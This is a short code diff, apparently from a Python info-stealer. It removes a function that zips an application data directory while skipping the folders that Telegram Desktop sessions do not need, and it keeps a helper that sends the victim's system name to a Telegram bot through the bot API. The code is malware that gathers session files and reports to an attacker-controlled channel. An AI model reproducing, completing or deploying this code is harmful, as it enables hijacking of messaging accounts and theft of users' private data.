@@ -1,26 +1,4 @@
-def create_zip_archive(source_dir, output_zip):
-    try:
-        with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
-            pass  # Создаем пустой архив для начала
-        with zipfile.ZipFile(output_zip + '.zip', 'a') as zipf:  # Открываем архив для добавления файлов
-            for root, _, files in os.walk(source_dir):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    if "user_data" in file_path or "webview" in file_path or "temp" in file_path or "emoji" in file_path or "shortcuts-default.json" in file_path:
-                        continue
-                    try:
-                        zipf.write(file_path, os.path.relpath(file_path, source_dir))
-                    except Exception as e:
-                        send_message_to_group(chat_id)
-                        time.sleep(10)
-                        pass
-        return output_zip + '.zip'
-    except Exception as e:
-        send_message_to_group(chat_id)
-        time.sleep(10)
-        print(f"Error creating zip archive: {str(e)}")
-        return None
-    pass
+
 def send_message_to_group(chat_id):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\n"}
